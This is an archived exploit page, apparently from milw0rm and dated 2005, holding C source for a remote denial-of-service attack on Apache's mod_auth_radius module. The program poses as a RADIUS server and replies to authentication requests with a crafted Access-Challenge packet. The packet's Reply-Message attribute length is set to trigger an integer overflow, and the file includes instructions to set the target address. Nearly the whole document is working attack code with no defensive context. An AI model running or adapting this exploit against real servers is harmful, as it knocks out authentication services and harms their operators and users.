<html>
<head>
<title>Apache mod_auth_radius Remote Denial of Service</title>
<pre>
/* gcc -o dos dos.c -lssl       
 * Make sure you change inet_addr at the bottom. /str0ke
 */

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;openssl/md5.h&gt;
#define RADIUS_AUTH_UDP_PORT 1645
#define RADIUS_PASSWORD_LEN 16
#define RADIUS_RANDOM_VECTOR_LEN 16
#define RADIUS_HEADER_LEN 20

/* RADIUS ID definitions. See RFC 2138 */
#define RADIUS_ACCESS_REQUEST 1
#define RADIUS_ACCESS_ACCEPT 2
#define RADIUS_ACCESS_REJECT 3
#define RADIUS_ACCESS_CHALLENGE 11

/* RADIUS attribute definitions. Also from RFC 2138 */
#define RADIUS_USER_NAME 1
#define RADIUS_PASSWORD 2
#define RADIUS_NAS_IP_ADDRESS 4
#define RADIUS_SERVICE_TYPE 6
#define RADIUS_REPLY_MESSAGE 18
#define RADIUS_STATE 24
#define RADIUS_SESSION_TIMEOUT 27
#define RADIUS_NAS_IDENTIFIER 32

/* service types : authenticate only for now */
#define RADIUS_AUTHENTICATE_ONLY 8
#define RADIUS_PACKET_RECV_SIZE 1024
#define RADIUS_PACKET_SEND_SIZE 1024
#define APACHE_RADIUS_MAGIC_STATE &quot;f36809ad&quot;

/* Per-attribute structure */
typedef struct attribute_t {
  unsigned char attribute;
  unsigned char length;
  unsigned char data[1];
} attribute_t;

/* Packet header structure */
typedef struct radius_packet_t {
  unsigned char code;
  unsigned char id;
  unsigned short length;
  unsigned char vector[RADIUS_RANDOM_VECTOR_LEN];
  attribute_t first;
} radius_packet_t;

char secret[] = &quot;testing123&quot;;

main (int argc, char **argv)
{
  int sock,cl,x,n;

  struct sockaddr_in sin,exp;
  char buffer[RADIUS_PACKET_RECV_SIZE], client[RADIUS_PACKET_SEND_SIZE];
  attribute_t *attr, *attrcl, *attrcl2;
  radius_packet_t *rad, *radcl;
  char vector[RADIUS_RANDOM_VECTOR_LEN];
  MD5_CTX sum;

  sock = socket (AF_INET, SOCK_DGRAM, 0);
  
  sin.sin_port = htons (RADIUS_AUTH_UDP_PORT);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = INADDR_ANY;
  bzero (sin.sin_zero, 8);

  bind (sock, (struct sockaddr*)&amp;sin, sizeof(struct sockaddr));
  
  n = sizeof (struct sockaddr);
  while ((x = recvfrom (sock, buffer, RADIUS_PACKET_RECV_SIZE, 0, (struct sockaddr*)&amp;sin, &amp;n)) &gt; -1)
  {
  printf (&quot;GOT PACKET!!!\n&quot;);
  rad = (radius_packet_t*)buffer;
  attr = (attribute_t*)&amp;rad-&gt;first;
  printf (&quot;%d-%s\n&quot;,ntohs(sin.sin_port),inet_ntoa(sin.sin_addr));
  break;
  }

  bzero(client,1024);
  radcl = (radius_packet_t*)client;
  attrcl = (attribute_t*)&amp;radcl-&gt;first; 
  
  radcl-&gt;code = RADIUS_ACCESS_CHALLENGE;
  radcl-&gt;id = 140; 

  n = (sizeof (radius_packet_t) + (sizeof(attribute_t) * 2) + 20); 
  radcl-&gt;length = htons(n);
  printf (&quot;----&gt;%d\n&quot;,ntohs(radcl-&gt;length));
  
  attrcl-&gt;attribute = RADIUS_STATE;
  attrcl-&gt;length = 3; 
  // attrcl-&gt;data = 1;
  
  attrcl2 = attrcl + 1;
  attrcl2-&gt;attribute = RADIUS_REPLY_MESSAGE;
  attrcl2-&gt;length = 1; // INTEGER OVERFLOW
  // attrcl2-&gt;data = 1;

  // strncpy (attrcl2 + 3, &quot;AAAAAAAAAAAAAAAAAAA\0&quot;, 20); 
  memcpy (radcl-&gt;vector, rad-&gt;vector,16);
  MD5_Init (&amp;sum);
  MD5_Update (&amp;sum, (unsigned char*)radcl, ntohs(radcl-&gt;length));
  MD5_Update (&amp;sum, secret, strlen(secret));

  MD5_Final (vector, &amp;sum);
  memcpy (radcl-&gt;vector, vector,16); 

  close (sock);
  
  cl = socket (AF_INET, SOCK_DGRAM, 0); 
  
  exp.sin_family = AF_INET;
  exp.sin_port = sin.sin_port;
  exp.sin_addr.s_addr = inet_addr(&quot;192.168.0.3&quot;);;
  bzero (exp.sin_zero,8);
  sendto (cl, &amp;client, n, 0 , (struct sockaddr*)&amp;exp, sizeof (struct sockaddr));
  perror (&quot;sendto:&quot;);
}</pre>
// milw0rm.com [2005-01-16]
</html>
